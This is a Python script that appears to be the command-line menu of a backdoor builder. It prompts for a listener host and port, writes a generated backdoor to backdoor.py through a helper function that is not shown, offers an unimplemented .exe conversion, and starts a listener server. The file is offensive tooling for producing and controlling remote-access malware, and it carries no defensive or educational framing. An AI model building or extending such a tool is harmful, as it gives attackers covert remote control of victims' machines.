from server import start_server
from os import system
import utils


utils.draw_animation()
utils.draw_main_menu()

while True:
    choice = input(">> ")

    if choice == '1':
        lhost = input("Type the listener host address >> ")
        lport = input("Type the listener port >> ")
        convert = input("Do you want to convert the backdoor to .exe ? (y/n) >> ").lower()
        if (convert == 'y'):
            pass
        else:
            file = open("backdoor.py", "w")
            string_code = utils.generate_backdoor_code(lhost, lport)
            file.write(string_code)
            file.close()
        

        system("clear")
        utils.draw_main_menu()
        print("\n[+] - Backdoor was generated!\n")
    elif choice == '2':
        start_server()
    elif choice == '0':
        print("Good bye...")
        exit(0)
    else:
        system("clear")
        utils.draw_main_menu()
        print("[-] Invalid option\n")
